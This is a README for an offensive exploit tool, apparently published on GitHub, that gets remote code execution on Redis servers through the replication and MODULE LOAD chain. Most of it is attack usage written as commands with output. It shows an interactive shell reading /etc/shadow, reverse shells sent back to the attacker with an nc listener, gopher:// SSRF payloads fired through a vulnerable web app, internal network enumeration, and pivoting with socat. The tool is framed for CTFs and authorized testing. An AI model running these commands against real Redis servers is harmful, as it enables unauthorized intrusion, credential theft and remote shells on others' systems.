# Redis Rogue PWN

Enhanced Redis rogue server exploit for CTF and authorized penetration testing engagements.

Exploits Redis (≤ 5.0.5, often later) via the **replication → MODULE LOAD** chain to achieve remote code execution. Built on the technique from [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) and the [ZeroNights 2018 Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf) research, rewritten from scratch for speed and flexibility in competition environments.

```
  ┌─────────────────────────────────────────────────┐
  │  Redis Rogue PWN  —  Enhanced for CTF            │
  │  Replication + MODULE LOAD → RCE                │
  │  Based on n0b0dyCN/redis-rogue-server            │
  └─────────────────────────────────────────────────┘
```

## How It Works

The exploit uses Redis replication to deliver a malicious shared library to the target:

```
Attacker                          Target Redis
   │                                   │
   │──── Connect + AUTH ──────────────→│
   │──── SLAVEOF attacker:port ──────→│  target becomes replica
   │──── CONFIG SET dbfilename exp.so→│  write payload as this filename
   │                                   │
   │←─── Replication PSYNC ───────────│  target connects to rogue server
   │──── Serve exp.so as RDB ───────→│  payload written to disk
   │                                   │
   │──── SLAVEOF NO ONE ─────────────→│  stop replicating
   │──── MODULE LOAD /path/exp.so ──→│  load the .so → RCE
   │──── system.exec "id" ──────────→│  execute arbitrary commands
   │                                   │
   │──── Cleanup (unload, rm, restore)│
```

The loaded module registers two commands:
- `system.exec <cmd>` — run a command and return output
- `system.rev <ip> <port>` — spawn a reverse shell

## What's Different From the Original

| Feature | n0b0dyCN original | redis-rogue-pwn |
|---|---|---|
| One-shot command (`-x`) | ✗ interactive only | ✓ |
| Built-in reverse shell listener | ✗ need separate `nc` | ✓ `--rev-listen` |
| Gopher/SSRF payload generator | ✗ | ✓ `--gen-gopher` |
| Recon / fingerprinting | ✗ | ✓ `--recon` |
| Redis 6+ ACL auth | ✗ | ✓ `--user` |
| RESP protocol handling | string `.find()` | proper encode/decode |
| Timeout control | hardcoded `sleep(2)` | configurable `--timeout` |
| Cleanup on failure | crashes dirty | always restores config |
| Server-only mode | ✗ (Dliv3 fork only) | ✓ with instructions |
| Custom module filename | ✗ | ✓ `--module-name` |
| Verbose traffic debug | basic print | `--verbose` RESP dump |

## Installation

**Requirements:** Python 3.6+ (stdlib only, no pip dependencies).

```bash
git clone https://github.com/YOURUSER/redis-rogue-pwn.git
cd redis-rogue-pwn
chmod +x redis-rogue-pwn.py
```

### Getting the Module

The exploit requires `exp.so`, a compiled Redis module that provides `system.exec` and `system.rev`. You have three options:

**Option A** — Use the prebuilt binary (from the original repo, x86_64 Linux):
```bash
# exp.so is included in this repo
ls -la exp.so
```

**Option B** — Compile from source:
```bash
cd RedisModulesSDK/exp/
make
cp exp.so ../../
```

**Option C** — Build from [RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand):
```bash
git clone https://github.com/RicterZ/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make
cp module.so /path/to/redis-rogue-pwn/exp.so
```

## Usage

```
usage: redis-rogue-pwn.py [-h] [-t TARGET] [-p RPORT] [-a AUTH] [--user USER]
                          [-l LHOST] [--lport LPORT] [--bind BIND]
                          [-e EXP_FILE] [--module-name MODULE_NAME] [-x CMD]
                          [--rev REV] [--rev-listen] [--recon] [--server-only]
                          [--gen-gopher] [--timeout TIMEOUT] [-v]
```

### Quick Reference

| Flag | Description |
|---|---|
| `-t`, `--target` | Target Redis host |
| `-p`, `--rport` | Target Redis port (default: 6379) |
| `-a`, `--auth` | Redis password |
| `--user` | Redis ACL username (Redis 6+) |
| `-l`, `--lhost` | Your IP (must be reachable from the target) |
| `--lport` | Rogue server listen port (default: 21000) |
| `--bind` | Rogue server bind address (default: 0.0.0.0) |
| `-e`, `--exp` | Path to the `.so` module (default: exp.so) |
| `--module-name` | Filename written on target disk (default: exp.so) |
| `-x`, `--cmd` | One-shot command — run and exit |
| `--rev` | Reverse shell to `IP:PORT` via `system.rev` |
| `--rev-listen` | Start a built-in listener for the reverse shell |
| `--recon` | Fingerprint target only (version, config, modules) |
| `--server-only` | Start rogue server only — for SSRF/blind scenarios |
| `--gen-gopher` | Generate Gopher SSRF payloads for the full chain |
| `--timeout` | Socket timeout in seconds (default: 8) |
| `-v`, `--verbose` | Show raw RESP protocol traffic |

## Examples

### Interactive Shell

Connect to an unauthenticated Redis, get a pseudo-shell:

```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2
```
```
[+] Connected to 10.10.10.5:6379
[*] Version:     5.0.5
[*] OS:          Linux 5.4.0-42-generic x86_64
[+] Module loaded — RCE achieved!
[+] Interactive shell — type 'exit' or Ctrl+C to quit

redis-pwn> id
uid=999(redis) gid=999(redis) groups=999(redis)
redis-pwn> cat /etc/shadow | head -3
root:$6$...
redis-pwn> exit
[*] Cleaning up...
[+] Module unloaded and .so removed
```

### One-Shot Command

Grab a flag and get out:

```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 -x 'cat /root/root.txt'
```

Script in a loop or chain with other tools:

```bash
# Enumerate internal network from the Redis host
for cmd in 'ip a' 'cat /etc/hosts' 'ss -tlnp' 'ls -la /home'; do
    python3 redis-rogue-pwn.py -t $TARGET -l $LHOST -x "$cmd" 2>/dev/null
done
```

### Reverse Shell (With Built-in Listener)

No need to open a separate terminal for `nc`:

```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 \
    --rev 10.10.14.2:9001 --rev-listen
```
```
[*] Starting reverse shell listener on 10.10.14.2:9001
[*] Sending reverse shell to 10.10.14.2:9001
[+] Shell from 10.10.10.5:48372!
──────────────────────────────────────────────────
id
uid=999(redis) gid=999(redis) groups=999(redis)
```

Or use an external listener:

```bash
# Terminal 1
nc -lvnp 9001

# Terminal 2
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 --rev 10.10.14.2:9001
```

### With Authentication

Standard password:
```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 -a 'S3cretP@ss' -x 'whoami'
```

Redis 6+ ACL (user + password):
```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 \
    --user admin -a 'AclP@ss' -x 'whoami'
```

### Recon Only

Fingerprint without exploiting — useful to check if MODULE is available before committing:

```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 --recon
```
```
[+] Connected to 10.10.10.5:6379

[*] ═══ Redis Recon ═══
[*] Version:     5.0.7
[*] OS:          Linux 5.4.0-42-generic x86_64
[*] Port:        6379
[*] Config file: /etc/redis/redis.conf
[*] dir:         /var/lib/redis
[*] dbfilename:  dump.rdb
[*] Loaded modules: none
[*] Role:        master
[*] Protected:   no
```

### Server-Only Mode

For **blind** or **SSRF** scenarios where you can't directly connect to Redis but can trigger commands through another channel (web SSRF, CRLF injection, etc.):

```bash
python3 redis-rogue-pwn.py --server-only -l 0.0.0.0 --lport 21000
```
```
[*] Server-only mode
[*] Trigger these commands on the target Redis:

  SLAVEOF 10.10.14.2 21000
  CONFIG SET dbfilename exp.so
    ... wait for sync ...
  SLAVEOF NO ONE
  MODULE LOAD /path/to/exp.so
  system.exec "id"

[*] Rogue server listening on 0.0.0.0:21000
[*] Waiting for victim to connect...
```

### Gopher SSRF Payload Generation

The killer feature for **web → Redis** CTF chains. Generates ready-to-fire `gopher://` URLs for each step of the exploit:

```bash
python3 redis-rogue-pwn.py --gen-gopher -t 127.0.0.1 -l 10.10.14.2 --lport 21000
```

This outputs five steps:

1. **SLAVEOF** — `gopher://` URL that sets up replication + dbfilename
2. **Rogue server** — command to start the server-only listener
3. **MODULE LOAD** — `gopher://` URL that stops replication and loads the module
4. **Execute** — `gopher://` URL that runs `system.exec`
5. **Cleanup** — `gopher://` URL that removes the module

Also outputs raw `echo -ne '...' | nc` one-liners for manual use.

With auth:
```bash
python3 redis-rogue-pwn.py --gen-gopher -t 127.0.0.1 -l 10.10.14.2 \
    -a 'redis_password' -x 'cat /flag.txt'
```

### Verbose / Debug

See full RESP protocol traffic for troubleshooting:

```bash
python3 redis-rogue-pwn.py -t 10.10.10.5 -l 10.10.14.2 -x 'id' -v
```

## Common CTF Scenarios

### Scenario 1: Direct Access (Unauthenticated Redis)

The simplest case — Redis is exposed and has no password:

```bash
# Quick recon
python3 redis-rogue-pwn.py -t $IP --recon

# Grab flags
python3 redis-rogue-pwn.py -t $IP -l $LHOST -x 'cat /root/root.txt'
```

### Scenario 2: Web App SSRF → Redis

You have an SSRF vulnerability (e.g., via `curl`, `file_get_contents`, SSRF in URL parameter) that can hit `gopher://`:

```bash
# 1. Generate all payloads
python3 redis-rogue-pwn.py --gen-gopher -t 127.0.0.1 -l $LHOST

# 2. Start the rogue server
python3 redis-rogue-pwn.py --server-only -l $LHOST --lport 21000

# 3. Fire step 1 SSRF through the web app (triggers SLAVEOF + replication)
curl "http://vulnerable.app/fetch?url=gopher://127.0.0.1:6379/_<step1_payload>"

# 4. Wait for rogue server to confirm delivery, then fire step 3
curl "http://vulnerable.app/fetch?url=gopher://127.0.0.1:6379/_<step3_payload>"

# 5. Execute commands via step 4
curl "http://vulnerable.app/fetch?url=gopher://127.0.0.1:6379/_<step4_payload>"
```

### Scenario 3: Redis Behind a Pivot

Redis is only accessible from an internal host you've already compromised:

```bash
# On your pivot host, set up a port forward (e.g., chisel, ligolo, socat)
socat TCP-LISTEN:6379,fork TCP:internal-redis:6379 &

# From your attack box, target through the pivot
python3 redis-rogue-pwn.py -t pivot-host -l $LHOST -x 'id'
```

### Scenario 4: Protected Mode / Auth Required

Redis has `protected-mode yes` or `requirepass`:

```bash
# Recon first to confirm it's auth-gated
python3 redis-rogue-pwn.py -t $IP --recon -a 'guessed_password'

# If auth works, full exploit
python3 redis-rogue-pwn.py -t $IP -l $LHOST -a 'guessed_password' -x 'whoami'
```

## Troubleshooting

**"MODULE LOAD failed"** — The Redis instance may have MODULE commands disabled via `rename-command` in `redis.conf`, or you're hitting a Redis version (6.2+) with ACL restrictions. Run `--recon` to check. If MODULE is renamed, you'll need to find the renamed command name (sometimes leaked in config files or error messages).

**Replication timeout** — The target can't reach your rogue server. Verify your `-l` IP is routable from the target (not a local-only address). If going through a pivot, your rogue server's `--bind` and `--lport` need to be reachable from the target's perspective.

**"ERR unknown command 'system.exec'"** — MODULE LOAD succeeded but the module didn't register correctly. This can happen if the `exp.so` was compiled for a different architecture. Recompile on a matching system or use a prebuilt binary for the target arch.

**Payload too large / corrupt** — The `exp.so` arrives via Redis replication as an RDB file. If something truncates it (firewalls, IDS), the MODULE LOAD will fail. Check with `-v` to see the byte count in the PSYNC response matches the actual file size.

**Redis 6+ with ACL** — Use `--user <username> -a <password>`. The user needs permissions for `SLAVEOF`, `CONFIG`, `MODULE`, and the custom `system.*` commands after module load.

## File Structure

```
redis-rogue-pwn/
├── redis-rogue-pwn.py      # Main exploit script
├── exp.so                   # Precompiled Redis module (x86_64)
├── README.md
├── LICENSE
└── RedisModulesSDK/         # Module source (optional, for recompilation)
    └── exp/
        ├── exp.c
        └── Makefile
```

## Credits

- **Original research:** [Pavel Toporkov — Redis post-exploitation (ZeroNights 2018)](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
- **Original tool:** [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
- **Improved fork:** [Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)
- **Execute module:** [RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand)

## Disclaimer

This tool is intended for **authorized security testing and CTF competitions only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing. The authors are not responsible for misuse.

## License

Apache-2.0 — same as the original project.
